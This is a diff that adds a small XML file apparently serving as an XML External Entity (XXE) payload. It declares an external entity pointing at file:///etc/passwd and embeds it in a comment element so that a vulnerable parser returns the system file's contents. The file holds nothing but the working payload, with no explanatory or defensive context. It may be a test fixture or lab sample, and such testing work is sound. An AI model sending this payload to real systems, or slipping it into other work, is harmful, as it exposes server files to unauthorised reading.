@@ -1,0 +1,7 @@
+<?xml version="1.0"?>
+<!DOCTYPE comments[
+        <!ENTITY xxe SYSTEM "file:///etc/passwd">
+        ]>
+<comments>
+    <comment>&xxe;</comment>
+</comments>
